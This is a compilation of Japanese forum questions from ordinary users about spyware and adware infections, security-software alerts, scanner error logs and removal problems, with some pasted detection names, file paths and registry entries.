家内が制作を請け負っているwebサイトが、先月からgoogleでブロックされたまま解除されません。URL:http://www.yasurc.***/　です。 このサイトは国際的奉仕団体であるロータリークラブの支部のもので、決しておかしなサイトではありません。googleの判定によれば、 「このウェブサイトにアクセスすると、コンピュータに損害が生じる可能性があります。」とのことで、セーフブラウジングのページを開くと、「yasurc.*** の現在のステータス：疑わしいサイトとして認識されています。このウェブサイトにアクセスするとコンピュータに損害を与える可能性があります。 過去 90 日間に、このサイトの一部で不審な動きが 1 回報告されています。 Google による巡回テスト状況：このサイトで過去 90 日間に Google がテストした 13 ページのうち 3 ページで、ユーザーの同意なしに不正なソフトウェアがダウンロードされ、インストールされていたことが判明しました。Google が最後にこのサイトを巡回したのは2009-12-10で、このサイトで不審なコンテンツが最後に検出されたのは2009-11-17です。」という内容で、どうもスパイウェアに感染したような意味にとれます。　一度原ファイルをウィルスソフトで完全スキャンした上で、サーバー上のすべてのファイルを削除し、改めてサイトを転送し直しましたが、未だに上記の表示が出ます。ただ、11/17以降はその不審なコンテンツは見つかっていないようなので、今のwebページはたぶん大丈夫のようです。googleのこのブロックを解除する方法がわかりません。どなたかご教授願います。ちなみに、gooやyahoo!から検索すると何も引っかかりません。　
特に不具合は感じていなかったのですが、 ESETでスキャンすると C:\WINDOWS\SYSTEM32\in7bMs.dll > CAB > bi.dll - Win32/TrojanDownloader.Stubby.A トロイ C:\WINDOWS\SYSTEM32\in7bMs.dll > CAB > preInsBI.exe - Win32/TrojanDownloader.Stubby.C トロイ というのが二つ検出されました。 自動削除されなかったのですが、これらはin7bMs.dll ごと削除してしまって良いものでしょうか。御教示頂ければ幸いです。
私は今、WindowsVistaHomePremiumを使ってます。 ネットゲームをアップデートして顔文字が使えなくなってしまったので UACを無効にして再起動しました。 そしたら、どうやらUpdateする前に踏んだと思われるワンクリ詐欺の広告(?) が出てきました。 家族共有なので、マズいと思いmsconfigでスタートアップを消そうと思いました。 そしたら、 『システム構成を実行するために必要な権限を持ってません。 Administrators グループのメンバとしてこのユーティリティを 実行してください。』 と、出て実行できませんでした。 UACをONにすれば起動できるかと思い、ONに使用とお思いまししたが。 なぜか、有効にチェックを入れてOKを押しても有効になりませんでした。 前回も同じようなことがあったので、管理者の方のユーザーでログインして 私のユーザーのUACを有効にしようとしました。 しかし、コントロールパネルを開こうと思っても 『エクスプローラの動作は停止しました。』 と。なり、コンピュータやピクチャも表示できません。 スパイウェアの可能性もあると思ってスキャンしようにも UACが無効だと管理者権限が使えないらしく セットアップや、ソフトの起動もできません。 どうすればUACを有効にできるか分かる方いませんか＞＜？ もしくは、この広告を消す方法が分かる方いませんか？　　長文失礼しました。
最近、ウィルスチェックの際、必ずスパイウェアが確認されましたと表示されます。そこで実験的に、ヤフーのホームページだけを出してウィルスチェックをしたところやはり２件のウィルスーの感染が合ったとの結果が出ました。別に如何わしいサイトを見たわけでもないのに、毎日ウィルスが感染されたと表示されることについては問題ないのでしょうか。 ちなみにそのウィルスは COOKIE_DOUBLECLICK です
msnのWindows liveのトップページに 『つながりに知り合いが追加されていませんが、知り合いを追加すると、その知り合いが行っている作業を表示できるようになります。例: 知り合いが共有している新しい写真ブログ』とありますがこれはファイル共有ソフトと同じではありませんか。 　行っている作業を表示できる、というのはリアルタイムで解るということでしょうか。 また、これはWindowsの標準機能であっても完全に動作を止めることができるでしょうか。例え親しい知人でも見せたくないですし見たくもありません。
windows　Vistaを使っています。 最近、Sogouという中国のサイトで音楽をダウンロードしたのですが、 それ以降パソコンを立ち上げた時に何かわからない中国の広告が右下に上がり、 右下のバーにアイコンが出るようになってしまいました。 アイコンを左クリックをして中国語で書いてあるメニュー（？） から退出というところをクリックしたらアイコンも広告も きえてくれるのですが、パソコンを立ち上げるとまた 出てきます。 完全にこれを消すにはどうしたらいいのでしょうか？ 回答よろしくお願いします。
ファイアウォールがかかってしまい ネットが 繋がらなくなりました
パソコンはDELL、ブラウザはIE8を使用しています。 人気ランキングなどのサイトからあるサイトへと飛ぶと、そのサイトが一瞬表示されているのにすぐに「ページが見つかりません」というサイトへ勝手に飛んでしまいます。 その「ページが見つかりません」というサイトが今まで見たことがないもので、DELLのホームページ（に自分は見えました）にすごく長いアドレス（このアドレスは自分が見たかったサイトのアドレスではありません）が見つかりませんでしたという文字と、関連していると思われるサイトの一覧（これはこのページに内にそう書いてあるだけで、自分から見ると全く関係ないサイトです）がずらっと表示されます。 今までサイトがなかった場合はもっとシンプルなサイトに飛んでいたように思い、また一瞬といえども見たかったサイトは一度表示されているのに見つからないと表示されるサイトへと飛んでしまうので不安になってしまいました。 こういう場合、なにかスパイウェアに侵入されているのでしょうか。 ちなみにmcafeeのフルスキャンでは異常はありませんでした。 どなたか回答よろしくお願いします。 わかりにく文章ですみません。
近頃、USBメモリを利用する機会が増えました。 自分のPCに第三者のUSBメモリを差し込んで、データの受け渡しをするのですが、 この時に第三者のUSBメモリに悪意のあるプログラムが仕込まれていたとします。それは、私のPC内のデータをこっそりと盗み取ってしまうようなものだとします。 このように自分のPCのUSBポートに接続された機器からの攻撃に対して、avast!やAd_awereといったフリーソフトは対応できるのでしょうか? また一般的なセキュリティソフトに関してはどうなのでしょうか? ちなみに自PCにはavast!とAd_awereをインストールしています。
パソコンを新しくして、 Nortonは最新バージョンをアップロードしたのですが、 それ以来、 iTunesをかけ流していて、気がつくと 警告表示がでます。いちいち、修復を押しては 解決されました。となるのですが、 どのようにしたらこの表示が出なくなるのでしょうか？ ※音楽ファイルには問題ないと思うのですが、 一応、いつも修復をクリックしております。
今デスクットプにもっどたら勝手に壁紙が変わってました おそらくキーロガーの仕業だと思うのですが おすすめの無料のギーロガー駆除ソフトがあったら教えて下さいできれば使い方も教えて下さい
ブラウザのクッキーに保存されるパスワードは、盗まれることはあるのですか？ ウィルスソフトやファイヤーウォールを設定していれば問題ないですか？ どこかのサイトでアクセスしたら使用しているブラウザの種類やＯＳやＩＰアドレスが表示されたことがあります。 それはどこに保存されている情報ですか？ 教えてください。よろしくお願いします。
いつも、ご指導ありがとうございます。 さて、少々ご質問させていただきます。 winXP SP3 avast!4.8 です。 先日、avast!の「トロイの木馬」の誤検出でも皆様のご指導を頂き感謝申し上げます。 それから、ウィルス等を重く捕らえていなかった(だんだん脅威という意識が薄れていたかもしれません)もので、いろいろと調べているうちに、 いつも、利用させて頂いているオンラインスキャン「カスペルスキー」が利用休止でしたので、F-Secureを利用しました。 するとスパイウェアが11個も検出されました! avast!では完全スキャンしても検出出来なかったので、驚いております。 以下が検出されたものです。現在、もう一台のPCをスキャン中です。 TrackingCookie.2o7 (スパイウェア) TrackingCookie.Advertising (スパイウェア) TrackingCookie.Atdmt (スパイウェア) TrackingCookie.Adtech (スパイウェア) TrackingCookie.Doubleclick (スパイウェア) TrackingCookie.Revsci (スパイウェア) TrackingCookie.Specificclick (スパイウェア) TrackingCookie.Xiti (スパイウェア) TrackingCookie.Webtrends (スパイウェア) TrackingCookie.Statcounter (スパイウェア) TrackingCookie.Yieldmanager (スパイウェア) 駆除してもらいましたが、これらは、パスワード等を収集したりするものでしょうか? 皆様なら、この後PCのメンテナンス処理をどのようにされますか? 今考えている事は ログイン等の重要なもののパスワードを変更する。くらいですが..... avast!は無償のものから、有料のものに更新中です。
スパイウェアなどで個人情報が流出することがあります。 ほとんどは、銀行やクレジットなどの情報が流出して、金銭的被害にあいます。 もちろんそれも心配ですが、趣味や経歴、弱点などが流出して、ネット上などで広がることが心配です。 趣味や経歴、弱点などが流出してしまうことというのはよくあるのでしょうか？ 芸能人ならともかく、一般人でもあるのでしょうか？
以前使っていたSpybot Search & Destroyを削除してしまって、再びダウンロードしたいのですが、公式ページに行こうとして検索して、見つけてクリックしても「サーバーが見つかりません」と表示されてしまいます。 これはすぐ直る不具合なのでしょうか。もしくは、ミラーなどを教えてくださるとありがたいです。（窓の杜は探してみましたが、ダウンロードページがうまく見つけられませんでした……；）
ipodに動画を入れるためにｍｐｇに変換してＹＯＵＴＵＢＥにからどうがをipodに入れました。　でも、その動画ｍｐｇのファイルから音楽だけを聞けるようにしたいのですがどうすればよいでしょうか？
ログ機能の強化しているルーターはありませんか。 攻撃してきたデータをすべてログできるものです。相手の送り込んできた生データを見てみたいのです。
ウィンドウズのワンケアが終わってしまい次のセキュリティソフトを探しています。 今のところＥＳＥＴスマートセキュリティがよさそうに思いますが、他社と比べ個人情報漏洩防止機能がないようです。 よく分かってないのですが、この機能はＰＣ自体の盗難や紛失した場合のことなのでしょうか。 ネットショップへの支払いにクレジットカードを使っているので気になります。
私はソースネクストのウイルスセキュリティＺＥＲＯとvistaに元々入っているwindous difenderを使ってます。 これだけで充分なのでしょうか？ 念のため、もうひとつぐらい、スパイウェアのフリーソフトを何か入れようかと思っております。 あまり詳しくないため、既存のソフトとの相性などが良く、あまり重たくなく、お勧めのフリーソフトがあれば教えていただきたいです。
InternetExplorer スプリクト　エラー [！]このページのスプリクトでエラーが発生しました。 ライン：１ 文字：324786 コード：0 エラー：道の実行時エラーです。 URL:http://cb.my.yahoo.co.jp/lib/my/js/core_0.1.168.js －－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－ ウインドウズ起動中時々　上記のこのメッセージが出ます。 yahoo関連のサイトですが、表示が出るまではアクセスしたことは有りません。 yahooメッセンジャー・yahooツールバーなども使ってません。 OS：WindowsXP-HE-SP3 Internet Explorer　バージョン8 何かいじった覚えも有りませんし、ウイルススキャンにも引っかからず 私では手詰まりです。 どなたかのお知恵をお借りできれば幸いです。
　安全のため、定期的に、インターネット一時ファイルを点検・削除していますが、今回次の2点のテキストファイルを見受けました。 1つ目　　wait.htm?・V・X・e…f・f&…[～ 2つ目　　wait.htm?・V・X・e…f・f60・b・djf・[～ 「[」の後まだ英字の文字列が続いています。 　インターネットオプションの閲覧の履歴の「削除」ボタンをクリックしても、「設定」→「ファイルの表示」から直接削除しようとしても削除できません。また、開こうとすると「・・・安全でない可能性があります。続行しますか？」と警告が出ます。プロパティを開くと、2009/11/20となっており最近のもののようです。 　これはいったい何なのですか？どう対処すればよいのか？お分かりの方ご教授のほどお願いいたします。　　
こんにちは。 ここ数日間のウェブ観覧履歴を確認したところ、 明らかに訪問していないURLがいくつか残っていました。 これはスパイウェアでしょうか？ 対策法などを教えて頂ければ幸いです。 因みにブラウザは最近変えました、IE８です。
お早う御座います。 WIN　XP　SP３です。 「Spybot－Search & Destroy 1.6.2.46」でSpyWareのチェックをしました。 「Microsoft Windows Secutity Center Disabled （SBI ＄ 2E20C9A9） 設定 H_KEY_LOCAL MACHINE￥SYSTEM￥CurrentControlSet￥Services￥wscsvc￥Start（is not）W=2」 というコメントが表示されました。 この意味が分かりません。 このあとどのように処理をしたら良いのでしょうか、宜しくお願いします。
こんばんは。お世話になります。 自営業を営んでいた両親が仕事で使っていたノートパソコンがあります。 もう自営業は辞めたので、そのパソコンをもらいました。 以前このパソコンを見たときには、税理士さんとの契約内容の中にある、 「ウイルスバスター」というセキュリティーソフトが入っていました。 しかしそのパソコンをもらった時（自営をやめて、１年くらい経ちました）には、 「ウイルスバスター」は入ってなくて、代わりに「Microsoft Forefront Client Security」 というセキュリティーソフト（？）が入っていました。 どうやらこれは、企業向けのソフトらしいですね。 ところが、両親に訊いてみると、「なにそれ？」と言います。 入れた記憶はないらしいです。 そういうスキルはないので、事実でしょう。 では、これはどうやってこのパソコンの中に入ったのか。 誰にもわかりません。 私もパソコンに関してはど素人なので、 「Microsoft Forefront Client Security 」 というソフトの事は、今回初めて知りました。 そこで、 http://www.microsoft.com/japan/forefront/clients … ↑のサイトを見てみたのですが、意味がよくわかりません。 このソフトは、有償なのか無償なのか、そこからわかりません。 スキャンに関しては、クイックスキャンはできます。 自分で設定は何もできないようです。 このソフトは、このまま入れていて問題ないのでしょうか。 どなたか、ど素人にもわかるように（できれば簡単に）説明していただけませんか？ よろしくお願いします。 余談ですが。 昨日、「ダウンローダ型トロイの木馬」とかいうものが検出されました。 削除には成功したようですが、このパソコン、使わない方がいいんでしょうか・・・。 ちなみに今は、別のパソコンから書き込んでいます。
XAMPPで自宅サーバーを公開しようとしてるのですが、 公開用のマシン以外に、同じルーターに極々個人的に利用しているPCをつなげています。 この場合、不正アクセス等あった場合に、 公開マシンだけでなく、その、ごくごく個人的な画像等が入っているPCからも、いろいろ流出してしまうことはあるのでしょうか。 偉いひと、教えてくださいm(_ _)m
Spybotの免疫がうまくいきません。 添付したダイアログが出るのですが、英語が読めず困っています。 ダイアログには何と書かれているのでしょうか？ また、対応策があれば教えてください。
ToRoI Busterは　XPで正常に動作しますか
この前、自分のPCにアドウェアが入ってしまいました。すぐにアドウェア対策ソフトでスキャンして出てきたのですが、駆除できませんでした。ウイルスのアドレスが分かったので調べてみたらGeneric AdClickerというウイルスだと分かり、削除しようと思ったのですが、ウイルスの本体が見つかりませんでした。 ちなみにレジストリのスタートアップにもありました。 <ウイルスのアドレス>c:\WINDOWS\system32\net.net <レジストリのスタートアップ,値のデータ>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\ CurrentVersion\Run\net,"c:\WINDOWS\system32\net.net" 忙しいところ申し訳ありませんがこれからどーすればいいか助言下さい。
先日海外のページを閲覧中、少し席を離れ戻ると outlookのメール作成画面が勝手に出ており あて先、CC全ての欄に Can't Get Rid Of A TRue Blue Hacker!!! と書いてありました。 閉じるボタンですぐ閉じたので、実際にOUTLOOKが起動したのか、ニセのブラウザ画面だったのかわかりません その後セーフモードでノートンのフルスキャンとSPYBOT、malwarebytesマカフィーのオンラインウイルススキャンをしましたが、何もウイルス、スパイウェア等は検知しませんでした。 英文を検索すると何件か同様の質問（すべて私と同じ日）がありましたがハッキリわかる人はおらず、解決はしていないようなのです。 ＜参考＞ http://answers.yahoo.com/question/index?qid=2009 … http://answers.yahoo.com/question/index?qid=2009 … http://forums.techguy.org/general-security/87742 … ハッキングをされている気配は無いのですが、ただのいたずらかもしれないし困っています リカバリをしなければならないでしょうか？ 日本語のページで事例が無いので困っています
プログラムの追加と削除にmirarの名前が残っている状態です。 削除をクリックするとmirarのサイトに行きアインストール実行のボタンをクリックしても無反応状態（ウインドウが白くなる）でアインストールが出来ません。 始めにプログラムの追加と削除からアインストールをして後にSpybot-S&Dで検索をかけてmirarを削除すれば良かったのかも？とPCを購入したお店の担当者に言われました。 一応mirarウイルスで検索をしレジストリの中にも問題のありそうなものはないと思うのですが、プログラムの追加と削除に名前が残っているだけでも危険な状態なのでしょうか？ 良いアドバイスがあればよろしくお願いします。 ちなみに下記操作をしレジストリをチェックしてみましたがRunの中には"ToolbarInstall"="[OriginalPathOfTheAdware]\MirarSetup.exe"は存在していませんでした。 [スタート] ボタンを押し、[ファイル名を指定して実行] をクリックします。 regedit と入力します。 その後、[OK] をクリックします。 次のレジストリキーを選択して削除します。 HKEY_LOCAL_MACHINE\SOFTWARE\RelatedPageInstall 次のレジストリキーを選択します。 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run 画面右側で、次の値を削除します。 "ToolbarInstall"="[OriginalPathOfTheAdware]\MirarSetup.exe" レジストリエディタを終了します。 念には念をで初期化した方が安心でしょうか？ それともそこまでの心配はいらないのでしょうか？
ネットをつないでいると次々と勝手にページが出てきます。 「トラビアン」「GetItOn」という出会い系や無料ゲームなどです。 右上の「×」で消すと固まって、見ていたいページまで消えてしまうことがあります。いちいち「エラーを報告しますか？」とでて、 見たかったページを復元しなければならなくて困っています。 以前動画を見ようとインストールしたのがいけなかったみたいで、 一応そのソフト？は捨てたはずなのですが、まだ出てきます。 解消法教えてください。 PC初心者なので、わかりやすく教えていただければ幸いです。
リモートデスクトップ操作が、PC　Tools　Firewall　Plusでブロックされてしまいます。 １、リモートデスクトップされる側がXP Pro ２．リモートデスクトップ操作する側は、XP　Home　で、 PC　Tools　Firewall Plus がインストールされています。 ３．リモートデスクトップ操作する側のリモートデスクトップから 接続すると、 「このコンピューターはリモートコンピューターに接続できません」 と表示されます。 PC Tools FireWall Plusを終了すると、接続可能になります。 ４．PC Tools　FireWall　Plusのどこを変更すると、接続可能になるか、 お教えください。
windows enterprise defenderは、スパイソフトのようです。大変に困ってます。このソフトの削除の仕方を教えて下さい。
カテゴリーがあっているかどうかわかりませんが・・・ windows起動後にウイスルバスター２００９が 「agent.exeがInternet Exploreの設定の変更しようとしたので ウイスルバスターがそれを拒否した」 という趣旨のウインドウが出てきました。 agent.exeは C:\ProgramData\Macrovision\FLEXnet Connect\6 にあります。 危険度も高レベルということだったので 削除したいと考えていますが、 いきなり削除は少し危険かなと思っています。 どのようにしたらよいか教えていただけないでしょうか？
銀行のインターネットバンキングを使い始めたのですが、「ワンタイムパスワード」を使うために、上記のソフトウェアをインストールすることになりました。 このソフトは今まで知らなかったのですが、ウィルス対策ソフトとしても使えるような感じがします。たとえば今使っている無料の「キングソフト」を削除してこれに替える、ということも可能なのでしょうか。 ご存知の方よろしくお願いいたします。
アクセスして、動画をダウンロードしてしまったら、登録請求画面が５分位置きに表示されています。 たぶんそのようなプログラムがインストールされているものと思いますが、削除の仕方とファイルがわかりません。 どのようにすればよいでしょうか？ どなたか教えてください。
会社のパソコンに誰がいまどんな画面を見てるか、どんな操作をしてるかを監視するソフトが入れられているそうです。 ネットはもちろん、表計算ソフトの入力もしているのが分かるそうです。 確認したわけではないのですが社内ではそのように言われています そんなソフトが入ってるかどうやったら確認できますか？
最新のSpy-bot S&Dでスキャンしてみたところ Win32.VB.svhというマルウェアが４つ検出されました。 Win32.VB.svh: [SBI $7E9215BC] 設定 (レジストリ変更, fixed) HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Run\CTFMON.EXE Win32.VB.svh: [SBI $7E9215BC] 設定 (レジストリ変更, fixed) HKEY_USERS\S-1-5-19\Software\Microsoft\Windows\CurrentVersion\Run\CTFMON.EXE Win32.VB.svh: [SBI $7E9215BC] 設定 (レジストリ変更, fixed) HKEY_USERS\S-1-5-20\Software\Microsoft\Windows\CurrentVersion\Run\CTFMON.EXE Win32.VB.svh: [SBI $7E9215BC] 設定 (レジストリ変更, fixed) HKEY_USERS\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Run\CTFMON.EXE 一応削除（検疫？）はされたようですが、レジストリ変更などと書いてあって心配です。 タチの悪いマルウェアなのでしょうか？
教えてください。 ノートンインターネットセキュリティーでアップデートして ウィルススキャンをかけたところ、Adware.Genが検出されました。 と、要確認項目に表示されました。 削除したつもりですが、これってウイルスですか？ 特段、変なサイトを見たつもりもないのですが・・・。 ついてはどなたか下記について教授ください。 (1)このウイルス？の種類と影響 (2)今後どこに気をつければいいのか？ ノートンインターネットセキュリティで Adware.Genの詳細を調べようとしましたが、 「ページがありません」と表示されました。 これまで、一度も要確認項目自体になにも検出されたこと がないので、困惑しております。 申し訳ありませんがどなたか助言お願いいたします。
Spybotを6ヶ月位使用しています。今月10月22日朝　いつものようにアップデートをすませてからスキャンをしたところ、エラーが発生するようになりました。（ウインドウズＸＰで　Ｓpybotは1.6.2.0） 　　　　　　エラーの表示内容はつぎのとうり スキャン中にエラーが発生しました!: Opachki.ru [1 - $8733DD3A] (TRegExpr(comp): Unmatched [] (pos 17)) スキャン中にエラーが発生しました!: Opachki　省略・・・ スキャン中にエラーが発生しました!: Opachki　省略・・・ スキャン中にエラーが発生しました!: Opachki　省略・・・ スキャン中にエラーが発生しました!: Opachki　省略・・・ スキャン中にエラーが発生しました!: Opachki 省略・・・ この時　新しい別のソフトは　インストールしていません。この日の朝、Spybotのアップデートをしただけです。AVGフリーを同時に使用していますが、AVGフリーを削除後、Spybotを削除して、Spybotのみ再インストールしましたが、まったく同じエラーが出ます。クッキーを削除した後ですと、おめでとうございます！脅威はみつかりませんでした。という表示もいっしょに出ます。 　機能しているようでもありますがエラーが出ると気持ちが悪いので、エラーが出なくなる直し方を教えて下さい。
ＯＳはＸＰ pro　ＳＰ３ です。 Spybot1.6.2を使って、スキャンしていると以下のようになります。 スキャン中にエラーが発生しました!: Opachki.ru [1 - $8733DD3A] (TRegExpr(comp): Unmatched [] (pos 17)) (Status) スキャン中にエラーが発生しました!: Opachki.ru [2 - $E6C84DAE] (TRegExpr(comp): Unmatched [] (pos 17)) (Status) スキャン中にエラーが発生しました!: Opachki.ru [3 - $46D80EC7] (TRegExpr(comp): Unmatched [] (pos 17)) (Status) スキャン中にエラーが発生しました!: Opachki.ru [4 - $250528DC] (TRegExpr(comp): Unmatched [] (pos 17)) (Status) スキャン中にエラーが発生しました!: Opachki.ru [5 - $70F7E1D5] (TRegExpr(comp): Unmatched [] (pos 17)) (Status) スキャン中にエラーが発生しました!: Opachki.ru [6 - $D68A767B] (TRegExpr(comp): Unmatched [] (pos 17)) (Status) おめでとうございます!: 脅威は検出されませんでした。 (Status) バグでしょうか？解決方法知っている方教えてください。お願いします。
ウィルス対策ソフトでよくCookieでスパイウェアの危険が引っかかるのですが、どのような被害にあっているのかわかりません。 スパイウェアがパソコンの中にあるとどのような被害を受けるのでしょう？ ウィルスとの明確な違いも教えてください。
トレンドマークオンラインスキャンをしました。結果は、ウイルス　０　トロイの木馬、ワーム　０　スパイウエア　１　セキュウリティホール　３９　となりました。スパイウエアはADW_BJFDです削除したほうがいいのでしょうか？ どうしたらいいのか、教えてください？よろしくお願いします。
spybotでCnsMinという危なそうなものが検出されました。うまく機能せず？にエラーという結果もありました。 調べてみるとJwordプラグインが原因だそうです。ちょうど先日入れたばかりです。 きちんとアンインストールできなかったので、システムの復元で5日前に戻しました。 それから、Jwordプラグインを削除しました。 けれど、その後、spybotを使っても、エラーが出ます。 エラーの内容は スキャン中にエラーが発生しました!: Opachki.ru [1 - $8733DD3A] (TRegExpr(comp): Unmatched [] (pos 17)) (Status) スキャン中にエラーが発生しました!: Opachki.ru [2 - $E6C84DAE] (TRegExpr(comp): Unmatched [] (pos 17)) (Status) スキャン中にエラーが発生しました!: Opachki.ru [3 - $46D80EC7] (TRegExpr(comp): Unmatched [] (pos 17)) (Status) スキャン中にエラーが発生しました!: Opachki.ru [4 - $250528DC] (TRegExpr(comp): Unmatched [] (pos 17)) (Status) スキャン中にエラーが発生しました!: Opachki.ru [5 - $70F7E1D5] (TRegExpr(comp): Unmatched [] (pos 17)) (Status) スキャン中にエラーが発生しました!: Opachki.ru [6 - $D68A767B] (TRegExpr(comp): Unmatched [] (pos 17)) (Status) です。 どうしたら、治るのでしょうか？ おねがいします。
PCが確実にウイルス（若しくはスパイウェア等）に感染しているとして、 カスペルスキーなどのアンチウイルスでも検出できないものがあると思いますが、 1ヶ月もしたら検出できなかったものでも定義ファイルがそろって、再びスキャンしたらほぼ完全に感染したものは全て駆除できるんでしょうか？ それとも、駆除出来ないものは1ヶ月、いやむしろ半永久的に駆除できず残ってしまうんでしょうか？ OS再インストールは、反則として、悪しからず…
3分くらいすると勝手にエロ画像が出現しますVistaです。 ワンクリック詐欺のパターンです。 画像が出なくなるようにするにはどうすればいいでしょうか？
Hotmailのフリーメールアドレスを長年使っていますが、10月17日に「メッセージを送れませんでした」という内容のエラーメッセージが10通くらい届きました。添付されていたオリジナルメールを見ると、私のメールアドレスで不特定の人に迷惑メールを送っていたようです。 最初は「何かの間違いかな」くらいに軽く思っていたのですが、私が使っているFacebookというコミュニティサイトに私の名前で「1日でこんなに稼げる」というメッセージを掲示板に書き込んでいるけど一体これは何なの？と友人からメールが来ました。 そのメッセージはやはり10月17日に2回書き込まれていて、携帯サイトから書き込んだことになっていますが、もちろんそんなメッセージを掲示板に書き込んだ覚えはありませんし、携帯からそのサイトにログインしたことさえありません。 私のメールアドレスを使って自分宛てに迷惑メールが来るというのはたまにありましたが、ログインしなければならないコミュニティサイトにまで書き込みがあるというのはちょっと異常で怖くなりました。 10月17日におかしなサイトを見た記憶もありませんし、家のPCにはウイルスソフトも入れてあります。どうすればいいでしょうか？Hotmailのメールアドレスは変えない方向で何とか解決できないでしょうか？詳しい方がいらっしゃったら教えてください。よろしくお願いします。
　avast!Home Edition のスクリーンセーバー機能はWindows Vistaの電源プランで、ディスプレイの電源が切れていて、かつコンピューターがスリープになっていない状態なら作動するのでしょうか。また作動中にディスプレイの電源が切れたらどうなるのでしょうか。 よろしくお願いします。
Ad-Aware AEをV8.1.0にバージョンアップしたら、動作がおかしくなりました。システムをひととおりスキャンしたあと―― 「現在のオブジェクト［Enumerating clsid's］」 という表示が出たままエンエンとスキャンが続き、終了しません。スキャン中を示す白旗の回転のようなものが、無限に回り続けます。 こうなると「スキャンの停止」ボタンが反応しないので、ウィンドウ右上の×ボタンで閉じるしかありません。こうして閉じて、改めて起動すると自動的にスキャンが再開され（前のスキャンが終了していない云々の表示が出ることがある）、やはり終了しません。 当初AAW AEにV8.1.0を上書きインストールしたのですが、これだとスキャン中に必ず異常終了するので、アンインストールしました、 アンインストール後、CCleanerとRegGlassを使ってLavasoftとAd-Awareの名のレジストリ・キーを徹底的に検索・削除（AAW2008からAEへのバージョンアップは、これでうまく行った）。その上で改めてV8.1.0をインストールした結果が、上記のような状況です。 対策をご存じの方、よろしくお願いします。環境はXP Pro SP3です。AE時代には、まったく問題がありませんでした。定義ファイルの更新があるあいだはAEに戻して使い続けようか、とも考えています。
偽物セキュリティ駆除で有名なのは、SUPER AntiSpywareですが、やはり得意分野や不得意分野もあると思うので、一応聞きますが、偽物セキュリティ以外の普通のスパイウェア（キーロガー、その他個人情報を盗む悪質なもの）、アドウェア、不正プログラム（ハッキングプログラムなど）などの検出性能は高いのでしょうか？普通レベルでしょうか？ また、偽物セキュリティソフトの駆除は非常に強いようですが、有料版を購入して常住させていれば、防ぐ能力も強いですか？ また、SpySweeperも性能がいいみたいですが、このソフトの検出性能はどうなのでしょうか？ 偽物セキュリティ、スパイウェア、アドウェア、不正プログラムの検出性能はそれぞれどうでしょうか？ 全般的な性能が良かったとしても、偽物セキュリティに弱ければ意味がないので、それぞれの回答をお願いします。 とにかく、厄介な偽物セキュリティが駆除できる、予防できる常住ソフトを入れておきたいです。 できれば、全部の種類において検出性能が高い方がいいのですが、SUPER AntiSpywareはどうですか？ それとも、SUPER AntiSpyware以上に、全種類に強力なソフトってありますか？ とりあえずは、有料、無料・言語については関係なく、教えるだけ教えてください。 SUPER AntiSpywareより、全部の種類において検出性能がいいソフトが海外にあったとしても、大差がなければ、SUPER AntiSpywareの有料版を購入します。 もちろん、SUPER AntiSpyware以上の強さを持つソフトが、日本語だったら即効購入です。 しかし、それはなかなか難しいと思うので、とにかく偽物セキュリティソフトだけにでも強い常住ソフトが欲しいです。 仮に偽物セキュリティだけに強いソフトがあったといても、普通のスパイウェアは、インストールされているG Data（期限が切れたら、Aviraに変更するするかもしれません）で十分補えるので、大丈夫だと思います。 ところで、G DataやAviraって偽物セキュリティに強いですか？ 強ければ、そもそも別のソフトは特に購入する必要はないので。 やはり、最も偽物セキュリティに強いのは、SUPER AntiSpywareですよね？ G DataやAviraが偽物セキュリティに強くないのであれば、偽物セキュリティから常住保護するために、SUPER AntiSpywareの有料版を購入する予定です。 とにかく、教えてほしいことは、G DataやAviraは偽物セキュリティに強いかどうかです。 滅多に感染しないものなので、SUPER AntiSpywareほどの性能ではなくても、ある程度対応できればいいです。 ただ、全く歯が立たないという場合や、駆除しても復活してしまうようでしたら、SUPER AntiSpywareの購入を考えます。 You Tubeで色々テストしている外国人がいましたが、英語はさっぱり分からないので、参考にできませんでした。 できれば、ここに書いた事を全部知りたいという気持ちもあるのですが、G DataやAviraが偽物セキュリティソフトに強いかどうか、ということだけでもいいので知りたいです。 大胆な話、それを知れば、だいたい自分なりにどのようにするか考えます、というよりそれが分からないと何も始りません。 現在の計画では、Avira AntiVir Personal、SUPER AntiSpyware Professional、COMODO Firewallにする予定です。 G DataかAviraが偽物セキュリティに強ければ、SUPER AntiSpywareの有料版は必要ないですし、計画自体が変わるので、知りたいです。 非常に分かりにくい文になってしまったかもしれませんが、お願いします。
Avira Antiverを気持ちよく使っているのに、なぜかマカフィーのポップアップ広告が画面中央に消しても消してもでるようになってしまいました。 Adobeか何かを入れたときにやられたんでしょうか、 ともかく消し方を伝授くださいますようおねがいしますー
基本的なことですが、教えてください。 ファイアーウォールとスパイウェア対策ソフトとはどう違うのでしょうか。 以前は「スパイウェア対策ソフト」＝「スパイウェア対策ソフト」と思っていました。 しかし最近セキュリティの本を読むうちに、スパイウェア対策ソフトの機能の一つがファイアーウォールなのかな？と思えてきました。 （スパイウェア対策ソフトとは情報を盗み出すソフトへの対策のためソフトで、そのために情報の出入りを監視する防壁（ファイアウォール、確か軍事用語から来た言葉で空母の対空砲火が元の意味ですよね？）を設けているのだろうという理解です。） ところがスパイウェア対策ソフトだが、ファイアウォールのないソフトもあると聞きました。 （としたら、どうやってスパイウェア対策をやっているのだろう？） この２つの言葉の意味と関係を教えてください。
どのカテゴリに投稿したら良いのか分からず、カテゴリ違いでしたらすみません。 今日パソコンでネットをしている時に、ファイアーウォール（Sygate）から2回注意が表示されました。 どこまで伏せたら良いのかわからないのですが このコンピュータがスキャニングされています。 このコンピュータのUDPポート: 3****, 3****, 3****, と3****　が　203.***.***.***.　からスキャンされました。 こんな感じです。関与しているアプリケーション名などは出ていません。 リモートホストは、IP検索すると　***.***.***.ad.jp　と出ます。 ***.***.***.ad.jpで検索すると、PDFファイルがいくつかひっかかって ポートスキャン・侵入や攻撃の事前準備・ポートのチェックなどポート関係の事が書いてあります。 情報系講師の名前も出ていて何かの研究っぽい感じです。 ***.***.***.ad.jpは、研究生共有ホストと書かれています。 念のためスパイウェアのスキャンをしましたが、特に検出されませんでした。 関係ないと思いますが注意が表示された時に見ていたのは、Firefox3.5で twitterとGoogleサイト（ログインして新規サイトを作成）です。 スキャンされているという注意が初めてで、セキュリティも詳しくなく不安なのですが これに対しての対策はどうしたら良いのでしょうか？
